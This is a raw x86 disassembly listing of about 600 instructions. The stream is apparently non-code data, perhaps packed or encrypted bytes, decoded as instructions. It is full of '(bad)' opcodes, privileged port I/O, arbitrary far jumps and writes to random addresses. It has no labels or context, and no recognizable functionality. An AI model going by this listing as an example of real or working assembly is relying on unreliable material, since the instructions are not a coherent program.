  4040d2:	mov    DWORD PTR [edi],edi
  4040d4:	mov    al,BYTE PTR [ebp-0x4d]
  4040d7:	push   esi
  4040d8:	push   0x6c
  4040da:	jl     0x404134
  4040dc:	popa   
  4040dd:	xor    BYTE PTR [edx],dh
  4040df:	cwde   
  4040e0:	pop    edx
  4040e1:	mov    al,ds:0x92902077
  4040e6:	std    
  4040e7:	in     eax,dx
  4040e8:	mov    dh,0xd
  4040ea:	sar    DWORD PTR [eax],0x49
  4040ed:	sar    ch,0xcd
  4040f0:	pop    esi
  4040f1:	push   eax
  4040f2:	jo     0x404135
  4040f4:	mov    ds:0x19b6ca3c,eax
  4040f9:	and    al,0xdd
  4040fb:	mov    ebx,0x43475dd5
  404100:	sub    esp,DWORD PTR ds:0x21a79411
  404106:	scas   al,BYTE PTR es:[edi]
  404107:	dec    esi
  404108:	inc    esp
  404109:	inc    eax
  40410a:	xor    ch,BYTE PTR [ebp-0x79]
  40410d:	cs cli 
  40410f:	sub    BYTE PTR [edi],cl
  404111:	fwait
  404112:	(bad)  
  404113:	repnz push ebp
  404115:	sub    DWORD PTR [edx+edx*8+0x5b],ebx
  404119:	adc    esi,DWORD PTR ds:0x86b0e0a
  40411f:	add    ebp,0x50
  404122:	mov    eax,0x29a9cb3
  404127:	stos   BYTE PTR es:[edi],al
  404128:	gs xor ah,cl
  40412b:	cmc    
  40412c:	or     edi,DWORD PTR [ecx+0x787bcd36]
  404132:	fsub   st(6),st
  404134:	jno    0x40415b
  404136:	dec    edx
  404137:	cmp    dl,BYTE PTR [edi]
  404139:	and    eax,0x90fdd6bb
  40413e:	lods   al,BYTE PTR ds:[esi]
  40413f:	neg    BYTE PTR [edi+0xb]
  404142:	jg     0x404160
  404144:	add    edi,DWORD PTR [edx+0x3b]
  404147:	fcomp  st(6)
  404149:	pop    es
  40414a:	pop    ss
  40414b:	icebp  
  40414c:	or     BYTE PTR [eax+0x4fa16057],bl
  404152:	jns    0x404102
  404154:	sbb    ebx,esi
  404156:	cld    
  404157:	jns    0x40415a
  404159:	sub    edx,DWORD PTR [esi+0x16c25cb2]
  40415f:	popa   
  404160:	(bad)  
  404162:	fsub   QWORD PTR ds:0x3c6623ad
  404168:	jp     0x404103
  40416a:	clc    
  40416b:	cmp    DWORD PTR [ebp-0x11],esi
  40416e:	stos   BYTE PTR es:[edi],al
  40416f:	sbb    BYTE PTR [edi+0x7b7c7175],cl
  404175:	pop    ds
  404176:	sbb    DWORD PTR [eax],ecx
  404178:	mov    ebp,0x2d6f7d87
  40417d:	int    0xb2
  40417f:	mov    DWORD PTR [edx],ebp
  404181:	or     BYTE PTR [edx],ah
  404183:	out    dx,eax
  404184:	aam    0xd8
  404186:	ss or  esp,edi
  404189:	mov    cl,0xb9
  40418b:	mov    esp,0xf363cad1
  404190:	loope  0x40416d
  404192:	pop    ecx
  404193:	mov    ebx,0x1ba5879f
  404198:	xor    BYTE PTR [esi],0xf2
  40419b:	int    0x1d
  40419d:	test   esp,0xf158f313
  4041a3:	imul   BYTE PTR [ecx+0x67]
  4041a6:	pop    edx
  4041a7:	loopne 0x4041a5
  4041a9:	fistp  QWORD PTR [edi]
  4041ab:	adc    DWORD PTR [ecx+edx*2],edx
  4041ae:	pusha  
  4041af:	mov    edx,0xe484a3cf
  4041b4:	and    al,0x2
  4041b7:	mov    dl,0xf3
  4041b9:	adc    edx,esp
  4041bb:	jne    0x404147
  4041bd:	ret    
  4041be:	(bad)  
  4041bf:	int    0xfc
  4041c1:	js     0x40415e
  4041c3:	mov    eax,0x29e0e189
  4041c8:	sbb    al,0x6e
  4041ca:	sub    DWORD PTR [ecx+0x5e],ebx
  4041cd:	cwde   
  4041ce:	dec    esi
  4041cf:	in     al,0xc2
  4041d1:	shl    BYTE PTR [eax],0x35
  4041d4:	mov    ds:0x7af3855c,eax
  4041d9:	sbb    al,0x9f
  4041db:	(bad)  
  4041dc:	ds addr16 push ss
  4041df:	outs   dx,BYTE PTR ds:[esi]
  4041e0:	dec    esp
  4041e1:	inc    edi
  4041e3:	add    al,0x7e
  4041e5:	test   eax,0x7e143db5
  4041ea:	inc    edi
  4041eb:	shl    dh,1
  4041ed:	pop    ecx
  4041ee:	mov    edx,0x949aecbb
  4041f3:	loop   0x40420b
  4041f5:	loope  0x4041e6
  4041f7:	into   
  4041f8:	and    edi,edi
  4041fa:	mov    edx,0x2b01ba57
  4041ff:	push   edx
  404200:	mov    esp,0x53116356
  404205:	mov    bh,0xc5
  404207:	mov    DWORD PTR [eax-0x27],0x10bc41c
  40420e:	jne    0x40428c
  404210:	jmp    0xd4e3:0x1a3a30e
  404217:	mov    ds:0xd6243c84,eax
  40421c:	out    dx,al
  40421d:	aas    
  40421e:	adc    ch,BYTE PTR [esi]
  404220:	sbb    edx,edx
  404222:	dec    edx
  404223:	sbb    al,0xa7
  404225:	test   al,0x13
  404227:	jmp    0x412e:0xc3348d56
  40422e:	popa   
  40422f:	xlat   BYTE PTR ds:[ebx]
  404230:	sbb    bh,BYTE PTR [ebx+0x54961c2]
  404236:	cmp    al,BYTE PTR [edi+0x51]
  404239:	mov    ds:0xb1490eb8,eax
  40423e:	adc    eax,0x4616d46d
  404243:	adc    al,cl
  404245:	pop    ds
  404246:	retf   0x6db6
  404249:	call   DWORD PTR [edx+0x7f]
  40424c:	fdivr  DWORD PTR [edi+0xb]
  40424f:	hlt    
  404250:	xor    DWORD PTR [ebx],esi
  404252:	lods   al,BYTE PTR ds:[esi]
  404253:	ror    esi,0x1a
  404256:	push   edx
  404257:	mov    WORD PTR [ebx-0x20],cs
  40425a:	cmp    eax,0x5a491b01
  40425f:	repz mov bh,BYTE PTR [esi+0x52]
  404263:	retf   
  404264:	sub    esp,eax
  404266:	das    
  404267:	imul   eax,DWORD PTR [ecx+0x4a],0xbdd67684
  40426e:	shl    DWORD PTR [eax+0x6fc40937],cl
  404274:	popf   
  404275:	jmp    0x8c5c9bf4
  40427a:	pop    es
  40427b:	jg     0x404291
  40427d:	jne    0x40426c
  40427f:	les    eax,FWORD PTR [esi]
  404281:	gs jmp 0x18a7ad09
  404287:	and    eax,edx
  404289:	or     DWORD PTR [ebp+0x3a906034],esp
  40428f:	inc    esi
  404290:	mov    bl,0xa5
  404292:	dec    edx
  404293:	mov    ebx,0xf8610d65
  404298:	mov    edx,0xe4e51bd6
  40429d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40429e:	xchg   esp,eax
  40429f:	in     al,dx
  4042a0:	ds cmp al,0x11
  4042a3:	in     eax,dx
  4042a4:	pop    ebp
  4042a5:	fcomp  DWORD PTR [edi-0x3c39ec03]
  4042ab:	adc    eax,0x81628c1
  4042b0:	fisub  WORD PTR [ecx-0x1d]
  4042b3:	dec    esp
  4042b4:	in     al,dx
  4042b5:	inc    esi
  4042b6:	mov    ebx,?
  4042b8:	loop   0x40426f
  4042ba:	ret    0x15f9
  4042bd:	mov    edi,0x67c3abe8
  4042c2:	xchg   edx,eax
  4042c3:	sub    eax,0x9750e692
  4042c8:	xchg   ebx,eax
  4042c9:	mov    eax,0x1b5b0a4f
  4042ce:	push   ss
  4042cf:	add    ebx,edi
  4042d1:	mov    edx,0x7bc9912f
  4042d6:	je     0x404338
  4042d8:	cmp    al,0x8e
  4042da:	mov    eax,0xba8e4624
  4042df:	cmp    BYTE PTR [ebx+0xdc94d10],ah
  4042e5:	pushf  
  4042e6:	mov    al,ds:0x3fe9ed5b
  4042eb:	out    0xfb,eax
  4042ed:	dec    ebx
  4042ee:	test   al,0x83
  4042f0:	mov    gs,WORD PTR [ebx+edi*2-0x4085fd00]
  4042f7:	jno    0x404320
  4042f9:	loop   0x4042ae
  4042fb:	jmp    0x15a7466f
  404300:	retf   0x489c
  404303:	in     al,dx
  404304:	jl     0x404360
  404306:	cld    
  404307:	aad    0x69
  404309:	rol    BYTE PTR [edi+0x4efebf3a],cl
  40430f:	popf   
  404310:	and    DWORD PTR [edi+eax*2-0x55],0x57
  404315:	into   
  404316:	or     BYTE PTR [esi],0x55
  404319:	add    DWORD PTR [ebx+eax*1],edi
  40431c:	adc    BYTE PTR [eax],bl
  40431e:	mov    eax,0xa3e7205f
  404323:	data16 xor BYTE PTR ds:0x787ebe5a,0xa0
  40432b:	jb     0x4042c4
  40432d:	js     0x404390
  40432f:	aaa    
  404330:	jmp    0x40435f
  404332:	mov    bl,cl
  404334:	loopne 0x404369
  404336:	xchg   DWORD PTR [esi+0x32],ecx
  404339:	push   ss
  40433a:	push   esi
  40433b:	mov    bh,0xe4
  40433d:	mov    ds:0x9e4691b0,eax
  404342:	add    ebp,DWORD PTR [edx-0x79]
  404345:	(bad)  
  404346:	clc    
  404347:	nop
  404348:	ret    0xa5cf
  40434b:	adc    BYTE PTR [ecx-0x6a],ch
  40434e:	in     eax,0xfa
  404350:	xor    ebp,edi
  404352:	mov    edi,0x5519d602
  404357:	sub    eax,0x8b48b79e
  40435c:	pop    edi
  40435d:	jnp    0x404354
  40435f:	mov    ah,ah
  404361:	sti    
  404362:	cmc    
  404363:	inc    ebx
  404364:	mov    cl,0x1
  404366:	loope  0x404383
  404368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404369:	push   edx
  40436a:	jbe    0x4043b7
  40436c:	ficom  DWORD PTR [ecx]
  40436e:	out    dx,eax
  40436f:	bound  esp,QWORD PTR [esi+0x23]
  404372:	add    dl,bh
  404374:	rol    DWORD PTR [ebp-0x4a],cl
  404377:	aas    
  404378:	loope  0x404309
  40437a:	scas   al,BYTE PTR es:[edi]
  40437b:	mov    edi,0x7e4ea13b
  404380:	or     al,0x38
  404382:	rcr    BYTE PTR [edi+0x77],cl
  404385:	leave  
  404386:	mov    esi,DWORD PTR [ebp-0x5790b61e]
  40438c:	out    dx,eax
  40438d:	hlt    
  40438e:	aas    
  40438f:	ret    0xdd8d
  404392:	cli    
  404393:	jp     0x4043bd
  404395:	mov    edx,0x9d65363d
  40439a:	test   BYTE PTR [edi-0x3f],dl
  40439d:	push   edi
  40439e:	ret    
  40439f:	or     BYTE PTR [edx-0x3acbd115],dl
  4043a5:	mov    ch,BYTE PTR [ecx+edi*4-0x7]
  4043a9:	mov    ebx,0xd5eb696
  4043ae:	aaa    
  4043af:	aas    
  4043b0:	(bad)  
  4043b1:	aad    0x7a
  4043b3:	js     0x4043be
  4043b5:	dec    eax
  4043b6:	pop    ds
  4043b7:	sub    DWORD PTR [edx],ecx
  4043b9:	lock lods ax,WORD PTR ds:[esi]
  4043bc:	lock test dl,0xd1
  4043c0:	push   0xffffffd7
  4043c2:	dec    eax
  4043c3:	xor    DWORD PTR [ebp+0x2bd87d4f],edi
  4043c9:	ss ret 0xadbc
  4043cd:	pop    edi
  4043ce:	mov    esp,0x194b57b4
  4043d3:	mov    esp,0x45514c06
  4043d8:	rol    BYTE PTR [edi],0x4
  4043db:	add    al,0xfb
  4043dd:	mov    ds:0xac9b0189,al
  4043e2:	jmp    0xa2ce:0x78872e2c
  4043e9:	in     al,0xec
  4043eb:	shr    DWORD PTR [edx],0x18
  4043ee:	mov    ebp,0xefd6c715
  4043f3:	je     0x404454
  4043f5:	cmp    DWORD PTR [ecx],eax
  4043f7:	adc    BYTE PTR es:[edx],0x73
  4043fb:	dec    eax
  4043fc:	push   ds
  4043fd:	test   bl,0x16
  404400:	or     al,BYTE PTR [edi]
  404402:	ret    0xbc95
  404405:	dec    ebx
  404406:	mov    edi,DWORD PTR ds:0x6d2ab053
  40440c:	sub    DWORD PTR [edi+0x2b],edx
  40440f:	ss mov ebp,ss
  404412:	dec    ebx
  404413:	jmp    0x58d3:0xda077e86
  40441a:	adc    ch,dh
  40441c:	imul   edi,DWORD PTR [eax-0x156aedff],0xebb94541
  404426:	push   ss
  404427:	dec    esp
  404428:	cld    
  404429:	mov    ebp,0x80bed770
  40442e:	dec    edi
  40442f:	je     0x404454
  404431:	and    DWORD PTR [esi-0xaa02947],edi
  404437:	xchg   BYTE PTR [ebx],cl
  404439:	add    dl,dh
  40443b:	shl    DWORD PTR ds:0x9828,1
  404440:	adc    BYTE PTR [edi+ebp*8+0x4df694c7],dh
  404447:	test   eax,0x628efc07
  40444c:	call   0xb954:0x1761b9fa
  404453:	push   0xffe54408
  404458:	dec    esi
  404459:	mov    al,ds:0xbbd1019a
  40445e:	and    al,0x79
  404460:	inc    eax
  404461:	in     eax,0xe4
  404463:	xchg   DWORD PTR [edx],ebp
  404465:	adc    DWORD PTR [edi+0x70],0x1
  404469:	pop    es
  40446a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446c:	fsub   st(3),st
  40446e:	sub    esi,DWORD PTR [edx+0x74]
  404471:	int    0xd0
  404473:	es nop
  404475:	(bad)  
  404476:	jnp    0x404444
  404478:	das    
  404479:	pushf  
  40447a:	sub    al,0xd8
  40447c:	dec    edi
  40447d:	out    0x20,eax
  40447f:	or     DWORD PTR [edx],eax
  404481:	gs sbb eax,0xdbf4cf0a
  404487:	arpl   WORD PTR [ecx-0x7e452b39],si
  40448d:	and    esi,esi
  40448f:	pop    esp
  404490:	addr16 ss call 0x7dbd:0x59b1c6e
  404499:	push   ss
  40449a:	mov    eax,0xf0c9cb3f
  40449f:	xchg   esi,edx
  4044a1:	dec    ecx
  4044a2:	jb     0x404481
  4044a4:	xlat   BYTE PTR ds:[ebx]
  4044a5:	cmp    ah,BYTE PTR [edi]
  4044a7:	sbb    al,0x9e
  4044a9:	jno    0x404456
  4044ab:	pop    ss
  4044ac:	jp     0x404486
  4044ae:	popa   
  4044af:	ret    
  4044b0:	and    dh,BYTE PTR [ebx+0x21]
  4044b3:	mov    cl,0xd1
  4044b5:	adc    dh,BYTE PTR [esp+edx*1+0x51]
  4044b9:	mov    ebx,0x7b94f574
  4044be:	mov    ebp,0x80eff2f6
  4044c3:	add    ecx,DWORD PTR gs:[esi+0x264a6699]
  4044ca:	jle    0x40445f
  4044cc:	test   al,0xa0
  4044ce:	idiv   eax
  4044d0:	jno    0x40451c
  4044d2:	fstp   QWORD PTR [ebx+0x7b]
  4044d5:	mov    ebp,0xaab347c1
  4044da:	mov    ebx,0x18246dee
  4044df:	add    BYTE PTR [eax+ebp*2+0x798dc4a4],ch
  4044e6:	(bad)
  4044ea:	(bad)  
  4044eb:	dec    ah
  4044ed:	fisub  DWORD PTR [edi]
  4044ef:	adc    BYTE PTR [edx+0x72],bl
  4044f2:	ret    
  4044f3:	hlt    
  4044f4:	mov    dl,0xbf
  4044f6:	mov    al,ds:0x522559bc
  4044fb:	nop
  4044fc:	daa    
  4044fd:	push   0x1405e349
  404502:	mov    ebp,0xca9662c0
  404507:	dec    edi
  404508:	ja     0x404511
  40450a:	test   eax,0x6dc64182
  40450f:	pop    esi
  404510:	js     0x404577
  404512:	dec    edi
  404513:	int3   
  404514:	sub    ecx,edi
  404516:	call   DWORD PTR [eax-0x1b]
  404519:	scas   eax,DWORD PTR es:[edi]
  40451a:	push   cs
  40451b:	pop    ss
  40451c:	adc    ebx,DWORD PTR [edx-0x6f]
  40451f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404520:	jbe    0x4044b5
  404522:	outs   dx,BYTE PTR ds:[esi]
  404523:	arpl   si,bx
  404525:	mov    ecx,DWORD PTR [eax-0x3d2c8c56]
  40452b:	push   eax
  40452c:	(bad)  
  40452d:	mov    ds:0xce82d2ef,al
  404532:	jecxz  0x4044ce
  404534:	or     ebp,DWORD PTR [ebp-0x22]
  404537:	mov    edx,0xf9deee66
  40453c:	sbb    eax,0x7b30f80c
  404541:	sbb    al,0x68
  404543:	aam    0x3a
  404545:	fcmovb st,st(6)
  404547:	add    esp,ebp
  404549:	punpcklwd mm4,DWORD PTR [edi]
  40454c:	mov    DWORD PTR [ebp-0x72ac5349],esp
  404552:	mov    bl,0x18
  404554:	es dec esi
  404556:	div    bh
  404558:	xor    eax,0x630bd779
  40455d:	shl    bh,0xf4
  404560:	ja     0x404563
  404562:	fldl2t 
  404564:	lea    eax,[ebx-0x5cecc307]
  40456a:	lock ins BYTE PTR es:[edi],dx
  40456c:	hlt    
  40456d:	ficom  DWORD PTR [edi]
  40456f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404570:	fiadd  WORD PTR [edx]
  404572:	pop    edx
  404573:	push   esi
  404574:	or     eax,0x93f078a5
  404579:	leave  
  40457a:	sbb    BYTE PTR [edi],cl
  40457c:	test   eax,0xf383ad12
  404581:	cmp    esi,DWORD PTR [esi+0x1f]
  404584:	sbb    bl,bh
  404586:	inc    edx
  404587:	dec    esi
  404588:	fdiv   st,st(4)
  40458a:	adc    ebp,DWORD PTR [eax+0x1f2938b7]
  404590:	adc    eax,0x8f757898
  404595:	push   edx
  404596:	bound  eax,QWORD PTR [esi]
  404598:	fdivr  DWORD PTR [eax]
  40459a:	mov    dh,0x99
  40459c:	mov    esi,0xdf36b26d
  4045a1:	mov    cl,0x15
  4045a3:	fistp  WORD PTR [ecx-0x4bbbdf31]
  4045a9:	pop    edi
  4045aa:	xchg   DWORD PTR [edx+0x384d6d65],ebp
  4045b0:	or     al,0x95
  4045b2:	sbb    al,0xd1
  4045b4:	jl     0x4045e5
  4045b6:	fdivr  st(7),st
  4045b8:	xchg   edi,eax
  4045b9:	push   ss
  4045ba:	xchg   edx,eax
  4045bb:	jne    0x4045e2
  4045bd:	inc    esp
  4045be:	add    BYTE PTR [edx-0x4c253001],dl
  4045c4:	les    ebp,FWORD PTR [edi]
  4045c6:	xor    cl,0xc8
  4045c9:	pop    ss
  4045ca:	xchg   BYTE PTR [ebx],bl
  4045cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045cd:	mov    dh,0x5d
  4045cf:	call   0x22baedcd
  4045d4:	sbb    cl,BYTE PTR [ebp+0x1ab3e0b]
  4045da:	jo     0x404598
  4045dc:	mov    ebx,0xf6e53823
  4045e1:	xchg   edx,eax
  4045e2:	pop    edx
  4045e3:	imul   esi,esp,0xdd70db82
  4045e9:	ds (bad) 
  4045eb:	aaa    
  4045ec:	fisttp DWORD PTR [ebp-0x44df0b33]
  4045f2:	in     al,0x6e
  4045f4:	fwait
  4045f5:	int    0xab
  4045f7:	xor    edx,DWORD PTR [ecx+0x52225ae9]
  4045fd:	push   eax
  4045fe:	ss mov dh,0x88
  404601:	cmp    cl,BYTE PTR [ebp-0x4fa12daf]
  404607:	btc    DWORD PTR [eax+0xf],ebp
  40460b:	pop    ebx
  40460c:	or     cl,BYTE PTR [ebx+0x5b]
  40460f:	add    al,0x71
  404611:	sbb    BYTE PTR [edx+0x3888f635],cl
  404617:	cmp    BYTE PTR [ebx+0x37],dh
  40461a:	das    
  40461b:	mov    ch,0x1
  40461d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40461e:	addr16 jbe 0x4045c8
  404621:	sub    bh,al
  404623:	cs dec edi
  404625:	aam    0x4e
  404627:	icebp  
  404628:	pop    ds
  404629:	jno    0x4045fb
  40462b:	std    
  40462c:	mov    ah,0x1a
  40462e:	mov    ah,0x61
  404630:	inc    edi
  404631:	(bad)  
  404632:	jns    0x404633
  404634:	sbb    ecx,DWORD PTR [edi-0x63]
  404637:	sbb    eax,0x28025b3c
  40463c:	jb     0x4045ff
  40463e:	adc    bl,BYTE PTR ds:[esi]
  404641:	iret   
  404642:	xchg   bh,bh
  404644:	addr16 jmp 0xe476b699
  40464a:	cdq    
  40464b:	arpl   WORD PTR [ecx+0x26147c3d],si
  404651:	loopne 0x40468e
  404653:	out    dx,eax
  404654:	pop    edx
  404655:	scas   al,BYTE PTR es:[edi]
  404656:	xor    DWORD PTR [edi-0xc],edx
  404659:	rcr    edx,cl
  40465b:	inc    ecx
  40465c:	into   
  40465d:	cmp    dl,0x93
  404660:	(bad)
  404663:	(bad)  
  404664:	mov    ebp,0xfb6344a9
  404669:	iret   
  40466a:	repnz pop ss
  40466c:	ja     0x40460b
  40466e:	add    eax,0xe22b6143
  404673:	aad    0x80
  404675:	iret   
  404676:	je     0x40461b
  404678:	pop    ds
  404679:	jmp    0xe825:0x4747b837
  404680:	push   ebx
  404681:	ss out dx,al
  404683:	mov    ebx,0x71fee47b
  404688:	pop    esi
  404689:	add    eax,0x7522acb0
  40468e:	adc    al,0x9e
  404690:	xchg   BYTE PTR [esi-0x5d],ah
  404693:	cs push es
  404695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404696:	mov    dh,0x9e
  404698:	mov    esp,edi
  40469a:	push   esi
  40469b:	aas    
  40469c:	(bad)  
  40469d:	int    0x69
  40469f:	xor    al,0x78
  4046a1:	mov    ds:0xffbd73ac,eax
  4046a6:	sahf   
  4046a7:	call   0xb1b5:0x9fab8f3a
  4046ae:	in     al,dx
  4046af:	ret    0xe7d9
  4046b2:	mov    esp,0x86a96e7b
  4046b7:	mov    al,ds:0x165a43be
  4046bc:	icebp  
  4046bd:	xchg   esp,eax
  4046be:	(bad)  
  4046bf:	ds mov dh,0xe3
  4046c2:	fldenv [esi-0x6c]
  4046c5:	xchg   edi,eax
  4046c6:	das    
  4046c7:	cmp    dh,BYTE PTR [edi-0x5c]
  4046ca:	and    BYTE PTR [edi+0x2e],ch
  4046cd:	inc    ebp
  4046ce:	lea    ecx,[edx]
  4046d0:	imul   edx,DWORD PTR [ebp+0x49bd8ec0],0x8f4a9f41
  4046da:	pusha  
  4046db:	sub    DWORD PTR [esi-0x451059b2],0x41
  4046e2:	mov    esp,0xfb3c2c1a
  4046e7:	jg     0x4046f0
  4046e9:	xor    bl,dl
  4046eb:	mov    ecx,0xf06a194d
  4046f0:	fcmovbe st,st(3)
  4046f2:	mov    ebx,0xc9db0a7b
  4046f7:	jl     0x4046c1
  4046f9:	jge    0x404715
  4046fb:	arpl   bp,bp
  4046fd:	dec    edx
  4046fe:	(bad)  
  4046ff:	cmovge ecx,ebp
  404702:	fucom  st(0)
  404704:	cmp    BYTE PTR [edi],bh
  404706:	jae    0x404691
  404708:	push   eax
  404709:	retf   0x9a1e
  40470c:	mov    dl,0x99
  40470e:	pop    ds
  40470f:	(bad)  
  404710:	jp     0x4046f2
  404712:	jae    0x404772
  404714:	sbb    eax,0xbc2f8a39
  404719:	pop    DWORD PTR [ebx-0x4f]
  40471c:	mov    al,ds:0xc0114e1a
  404721:	or     eax,0xd11a1b66
  404726:	dec    ebp
  404727:	les    edx,FWORD PTR [eax]
  404729:	or     eax,0x10d0467d
  40472e:	jbe    0x4046c8
  404730:	and    eax,DWORD PTR [ecx-0x413c8343]
  404736:	ret    
  404737:	shl    al,0x9c
  40473a:	(bad)  
  40473b:	mov    esi,0xdd460d4a
  404740:	sbb    BYTE PTR [ebp+0x67],dl
  404743:	or     al,0xa0
  404745:	sbb    eax,0xe88ef5f8
  40474a:	leave  
  40474b:	add    esp,ebp
  40474d:	push   esp
  40474e:	mov    bl,0x45
  404750:	les    edi,FWORD PTR [ecx-0x2c]
  404753:	pop    eax
  404754:	add    ebx,esp
  404756:	jge    0x40474c
  404758:	dec    esi
  404759:	sub    eax,0x81dec563
  40475e:	or     eax,0xfc04b316
  404763:	push   eax
  404764:	pusha  
  404765:	mov    ds:0x602848ef,al
  40476b:	sub    al,dl
  40476d:	mov    ebx,0xe35ba864
  404772:	mov    DWORD PTR [ebx],edx
  404774:	xchg   esp,eax
  404775:	and    eax,0xb0dab62c
  40477a:	push   eax
  40477b:	xor    bl,0x8c
  40477e:	push   es
  40477f:	or     al,0x12
  404781:	xchg   cl,dh
  404783:	mov    eax,0x196e8b20
  404788:	test   BYTE PTR [ebx+0x2a70ed8d],bh
  40478e:	daa    
  40478f:	inc    eax
  404790:	repz add al,BYTE PTR [edi]
  404793:	lods   eax,DWORD PTR ds:[esi]
  404794:	cmp    BYTE PTR [ecx],bl
  404796:	mov    BYTE PTR [edi-0x4c],al
  404799:	cdq    
  40479a:	mov    eax,ds:0x5c38c691
  40479f:	dec    edx
  4047a0:	iret   
  4047a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a2:	xor    DWORD PTR [edi-0x40],0x2cc19091
  4047a9:	ins    BYTE PTR es:[edi],dx
  4047aa:	mov    ds:0x7a10ad35,eax
  4047af:	xor    BYTE PTR [edx-0xc],0x94
  4047b3:	sbb    ecx,DWORD PTR [ebp+0x212b84ac]
  4047b9:	in     eax,dx
  4047ba:	or     al,0x63
  4047bc:	fnstcw WORD PTR [edi]
  4047be:	push   esp
  4047bf:	xchg   ebx,edx
  4047c1:	sub    DWORD PTR ds:0xa769cb60,ebp
  4047c7:	sahf   
  4047c8:	jne    0x4047c8
  4047ca:	cmp    DWORD PTR [ebp+ebx*2-0x47],ebx
  4047ce:	adc    ah,BYTE PTR [edi-0x5c]
  4047d1:	and    eax,0x1d8ce2e7
  4047d6:	je     0x404787
  4047d8:	and    ebx,DWORD PTR [ebx-0x1bded2c0]
  4047de:	pop    es
  4047df:	mov    ebx,0x152b023a
  4047e4:	jbe    0x4047d6
  4047e6:	retf   
  4047e7:	sub    BYTE PTR [ecx+0xc],dl
  4047ea:	rcr    dl,0x7f
  4047ed:	lods   al,BYTE PTR ds:[esi]
  4047ee:	in     al,dx
  4047ef:	inc    ecx
  4047f0:	in     al,0xc1
  4047f2:	or     DWORD PTR [edi-0x2a],esp
  4047f5:	call   0x78c1b243
  4047fa:	pop    ss
  4047fb:	mov    bl,dh
  4047fd:	sar    BYTE PTR [ebp-0x49],1
  404800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404801:	sub    al,0x4f
  404803:	jmp    0xe6bf566a
  404808:	stos   BYTE PTR es:[edi],al
  404809:	sbb    dl,BYTE PTR [edx]
  40480b:	mov    bh,0x58
  40480d:	cmp    DWORD PTR [eax],ebp
  40480f:	push   0x5e
  404811:	fs xor al,BYTE PTR cs:[ecx]
  404815:	hlt    
  404816:	call   0xf323:0x4dcef60f
  40481d:	arpl   WORD PTR [ebx-0x158ac1bd],ax
  404823:	mov    ah,BYTE PTR ds:0x83a41af5
  404829:	add    bh,BYTE PTR [edx]
  40482b:	jb     0x4047f6
  40482d:	adc    eax,0xeeaa0313
  404832:	(bad)  
  404833:	iret   
  404834:	std    
  404835:	inc    edx
  404836:	ror    BYTE PTR [ebp-0x9],0xfa
  40483a:	jns    0x40489c
  40483c:	mov    ecx,0xe466346d
  404841:	int3   
  404842:	sar    BYTE PTR [ecx+0x3],cl
  404845:	inc    ecx
  404846:	je     0x404817
  404848:	mov    edi,0x17e24d1e
  40484d:	mov    dh,0xbe
  40484f:	test   al,0x4c
  404851:	mov    al,0xd2
  404853:	pop    ebp
  404854:	pop    eax
  404855:	jmp    0x6330:0xf22e30a
  40485c:	and    bl,BYTE PTR [edx-0x32]
  40485f:	mov    WORD PTR [edi],fs
  404861:	stc    
  404862:	(bad)  
  404863:	stos   DWORD PTR es:[edi],eax
  404864:	mul    DWORD PTR [ebx+0x18]
  404867:	jnp    0x4047ee
  404869:	int    0x47
  40486b:	adc    al,0x85
  40486d:	out    dx,eax
  40486e:	jo     0x4048cd
  404870:	imul   ecx,esp,0x894adcba
  404876:	loope  0x4048cf
  404878:	dec    edi
  404879:	xor    BYTE PTR [esi-0x49601899],0xcf
  404880:	xor    al,0x23
  404882:	jnp    0x4048f1
  404884:	rol    BYTE PTR ds:0x857d1ca2,cl
  40488a:	dec    edi
  40488b:	mov    cl,0x46
  40488d:	cmp    ecx,DWORD PTR [esi]
  40488f:	adc    bl,BYTE PTR [ebx+edi*1+0x6df1a110]
  404896:	aaa    
  404897:	or     BYTE PTR [ebp+ebx*4-0x66a7b5c2],ch
  40489e:	xor    al,0xf5
  4048a0:	outs   dx,BYTE PTR ds:[esi]
  4048a1:	into   
  4048a2:	aad    0x7c
  4048a4:	sub    al,0x91
  4048a6:	inc    ebx
  4048a7:	sbb    eax,0x97073cc5
  4048ac:	push   0x16069043
  4048b1:	push   ds
  4048b2:	test   eax,0x560b9290
  4048b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b8:	mov    esp,0xb43cf825
  4048bd:	sub    BYTE PTR [ecx+0x10],bl
  4048c0:	jp     0x404857
  4048c2:	ficom  DWORD PTR [ebx+0x2]
  4048c5:	and    eax,0xe1d8c95c
  4048ca:	mov    ds:0x261654e,eax
  4048cf:	aas    
  4048d0:	loopne 0x40491f
  4048d2:	mov    cl,0x5a
  4048d4:	fist   DWORD PTR [ebx]
  4048d6:	sar    BYTE PTR [eax+0x17],0xb6
  4048da:	das    
  4048db:	and    dl,BYTE PTR [ebp+0xd2073f1]
  4048e1:	test   DWORD PTR [ebp-0x5903a0af],ecx
  4048e7:	mov    edx,0x9d7c66a3
  4048ec:	in     al,0x8
  4048ee:	or     edx,edx
  4048f0:	sub    BYTE PTR [edi+0x15],dl
  4048f3:	ins    DWORD PTR es:[edi],dx
  4048f4:	ins    DWORD PTR es:[edi],dx
  4048f5:	jae    0x4048be
  4048f7:	div    cl
  4048f9:	repnz mov dh,0x6d
  4048fc:	ins    DWORD PTR es:[edi],dx
  4048fd:	add    eax,0xb09930f9
  404902:	and    DWORD PTR [eax+esi*8],esp
  404905:	sub    BYTE PTR [eax+0x747db3e4],0xfe
  40490c:	mov    esp,0xdb02083f
  404911:	fwait
  404912:	pop    es
  404913:	adc    al,0x94
  404915:	mov    bl,0x82
  404917:	or     BYTE PTR [edi-0x2e],ch
  40491a:	sbb    BYTE PTR ds:0xe71044da,0xe0
  404921:	idiv   edi
  404923:	pop    ecx
  404924:	xchg   BYTE PTR [edx-0x12],ch
  404927:	imul   esp,DWORD PTR [edx+0x4950b46a],0xffffffd4
  40492e:	(bad)  
  404930:	loopne 0x404944
  404932:	lock mov WORD PTR [eax-0x7681a566],es
  404939:	fwait
